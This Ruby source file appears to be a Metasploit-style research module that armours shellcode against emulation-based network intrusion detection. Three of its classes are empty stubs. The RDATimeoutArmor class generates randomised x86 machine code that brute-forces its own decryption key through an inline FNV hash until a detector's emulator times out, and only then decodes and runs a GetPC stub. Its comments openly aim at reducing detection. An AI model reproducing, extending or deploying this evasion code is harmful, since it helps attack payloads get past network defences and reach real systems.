# -*- coding: binary -*-

# =============================================================
# Anti-emulation armoring through exceeding execution threshold
#
# @Author: Jos Wetzels
# =============================================================

require 'ebnids/ebnids'
require 'ebnids/getpc'
require 'ebnids/keygen'
require 'rex/poly'
require 'rex/arch'
require 'rex/text'

module Ebnids

  # TODO:
  class OpaqueTimeoutArmor < AntiEmulArmor

    def initialize
      super(
        'Name'             => '',  
        'ID'               => 15,             
        'Description'      => 'Anti-emulation armoring using opaque loops to exceed execution threshold',
        'Author'           => 'Jos Wetzels',   
        'License'          => MSF_LICENSE,   
        'Target'           => '',             
        'SizeIncrease'     => 0,  
        'isGetPC'          => 1,  
        'hasEncoder'       => 0,          
        'Conflicts'        => [],             
        'PreDeps'          => [],             
        'PostDeps'         => [])             
    end

    #
    # 
    #
    #
    # [*] Note:
    #
    def getPCStub(getPCDestReg)
    end

  end

  # TODO:
  class IntensiveTimeoutArmor < AntiEmulArmor

    def initialize
      super(
        'Name'             => '',  
        'ID'               => 16,             
        'Description'      => 'Anti-emulation armoring using intensive loops to exceed execution threshold',
        'Author'           => 'Jos Wetzels',   
        'License'          => MSF_LICENSE,   
        'Target'           => '',             
        'SizeIncrease'     => 0,  
        'isGetPC'          => 1,  
        'hasEncoder'       => 0,          
        'Conflicts'        => [],             
        'PreDeps'          => [],             
        'PostDeps'         => [])             
    end

    #
    # 
    #
    #
    # [*] Note:
    #
    def getPCStub(getPCDestReg)
    end

  end

  # TODO:
  class IntegratedTimeoutArmor < AntiEmulArmor

    def initialize
      super(
        'Name'             => '',  
        'ID'               => 17,             
        'Description'      => 'Anti-emulation armoring using integrated loops to exceed execution threshold',
        'Author'           => 'Jos Wetzels',   
        'License'          => MSF_LICENSE,   
        'Target'           => '',             
        'SizeIncrease'     => 0,  
        'isGetPC'          => 1,  
        'hasEncoder'       => 0,          
        'Conflicts'        => [],             
        'PreDeps'          => [],             
        'PostDeps'         => [])             
    end

    #
    # 
    #
    #
    # [*] Note:
    #
    def getPCStub(getPCDestReg)
    end

  end

  class RDATimeoutArmor < AntiEmulArmor

    @@keyReg
    @@keyVal

    def initialize
      super(
        'Name'             => 'RDA',  
        'ID'               => 18,             
        'Description'      => 'Anti-emulation armoring using Random Decryption Algorithm (RDA) to exceed execution threshold',
        'Author'           => 'Jos Wetzels',   
        'License'          => MSF_LICENSE,   
        'Target'           => '',             
        'SizeIncrease'     => 0,  
        'isGetPC'          => 1,  
        'hasEncoder'       => 0,          
        'Conflicts'        => [],             
        'PreDeps'          => [],             
        'PostDeps'         => [])             
    end


    #
    # Overriden method to fill key registery
    # No returned code here because this is handled by getPCStub as key generation for RDA is done by brute-force
    #
    def fillKeyReg(keyReg, keyVal)
      @@keyReg = keyReg
      return ""
    end

    #
    # Overriden method to set key value
    #
    def setKeyVal(keyVal)
      @@keyVal = keyVal
    end

    #
    # Fowler–Noll–Vo 32-bit non-cryptographic hash function taken from: https://github.com/jakedouglas/fnv-ruby/blob/master/lib/fnv.rb
    #   FNV was chosen because of its reasonably low collision rate and its small implementational size (lowering detection surface)
    #
    def fnv1_32(data)
      hash = 0x811c9dc5

      data.bytes.each do |byte|
        hash = (hash * 0x01000193) % (2 ** 32)
        hash = hash ^ byte
      end

      hash
    end

    #
    # Generates Random Decryption Algorithm (RDA)-based timeout GetPC and key recovery stub
    # 
    # [*] Limitations:
    #     - Partially error-prone due to collisions in FNV
    #
    # [*] Note:
    #       - Improve by:
    #         - removing null-byte in RETN 8
    #         - making more polymorphic
    #         - implementing routine in obtain_key override that only obtains keys where there are no collisions with hash for inputs below keyvalue
    #         OR
    #         - using more collision-resistant, small-sized hash function than FNV
    #
    def getPCStub(getPCDestReg)
      badchars = @module_metadata['badchars']

      gp_regs = Array[Rex::Arch::X86::EAX, Rex::Arch::X86::ECX, Rex::Arch::X86::EDX, Rex::Arch::X86::EBX, Rex::Arch::X86::ESI, Rex::Arch::X86::EDI]
      
      # random register
      reg1 = gp_regs[Random.rand(6)]

      fnvKey = fnv1_32(Rex::Arch::X86.pack_dword(@@keyVal))

      plainGetPCStub = Ebnids::GetPCStub.stackGetPC(getPCDestReg, badchars) # plaintext getPC stub
      encodedGetPCStub = (plainGetPCStub.unpack('V')[0] ^ fnvKey) # encode stub using hash of key

      fnvPlainGetPCStub = fnv1_32(plainGetPCStub)

      stub = Rex::Arch::X86.jmp_short(0x20) + # jmp short start_stub

               #  Fowler–Noll–Vo 32-bit non-cryptographic hash function as per: http://www.isthe.com/chongo/tech/comp/fnv/
               Rex::Arch::X86.push_reg(Rex::Arch::X86::ESI) + 
               Rex::Arch::X86.push_reg(Rex::Arch::X86::EDI) +
               "\x8B" + (0x44 + (8 * Rex::Arch::X86::ESI)).chr + "\x24\x0C" + # MOV ESI, [ESP + 0x0C]
               "\x8B" + (0x44 + (8 * Rex::Arch::X86::ECX)).chr + "\x24\x10" + # MOV ECX, [ESP + 0x10]
               Rex::Arch::X86.mov_dword(Rex::Arch::X86::EAX, 0x811C9DC5) + # fnv_32_basis
               Rex::Arch::X86.mov_dword(Rex::Arch::X86::EDI, 0x1000193) + # fnv_32_prime
               # fnv_loop:
                 "\xF7\xE7" + # MUL EDI
                 "\x32\x06" + # XOR AL, [ESI]
                 "\x46" + # INC ESI
               Rex::Arch::X86.loop(-7) + # loop fnv_loop
               Rex::Arch::X86.pop_dword(Rex::Arch::X86::EDI) +
               Rex::Arch::X86.pop_dword(Rex::Arch::X86::ESI) +
               "\xC2\x08\x00" + # RETN 8

             # start_stub:
             Rex::Arch::X86.xor_reg(@@keyReg, @@keyReg) + # XOR @@keyReg, @@keyReg

             # nextKey:
               (0x40 + @@keyReg).chr + # INC @@keyReg
               Rex::Arch::X86.push_reg(@@keyReg) + # PUSH @@keyReg (save for later)
               Rex::Arch::X86.mov_reg(reg1, Rex::Arch::X86::ESP) + # MOV reg1, ESP

               Rex::Arch::X86.push_byte(4) + # push 4
               Rex::Arch::X86.push_reg(reg1) # PUSH reg1

        # re-randomize
        reg1 = gp_regs[Random.rand(6)]   

        stub = stub + Rex::Arch::X86.call(-(stub.bytesize + 3)) + # CALL fnv()
               "\x68" + Rex::Arch::X86.pack_dword(encodedGetPCStub) + # PUSH encodedGetPCStub
               "\x31\x04\x24" + # XOR [ESP], EAX
               Rex::Arch::X86.mov_reg(reg1, Rex::Arch::X86::ESP) +

               Rex::Arch::X86.push_byte(4) + # push 4 NOTE: depends on the size of encodedGetPCStub which is currently presumed static (DWORD-size)
               Rex::Arch::X86.push_reg(reg1) # PUSH reg1

        # re-randomize
        reg1 = gp_regs[Random.rand(6)]  

        stub = stub + Rex::Arch::X86.call(-(stub.bytesize + 3)) + # CALL fnv()
               "\x3D" + Rex::Arch::X86.pack_dword(fnvPlainGetPCStub) + # CMP EAX, fnv(plainGetPCStub)
               Rex::Arch::X86.je(0x04) + # je executeGetPC
               Rex::Arch::X86.pop_dword(reg1) + # remove pushed stub from stack
               Rex::Arch::X86.pop_dword(@@keyReg) + # restore @@keyReg

             Rex::Arch::X86.jmp_short(-0x29) + # JMP SHORT nextKey
             Rex::Arch::X86.call_reg(Rex::Arch::X86::ESP) + # CALL ESP
             Rex::Arch::X86.sub(-5, getPCDestReg, badchars, false, true) + # adjust for additional bytes
             Rex::Arch::X86.pop_dword(@@keyReg) + # remove pushed stub from stack
             Rex::Arch::X86.pop_dword(@@keyReg) # restore @@keyReg             

      return stub
    end

  end

end
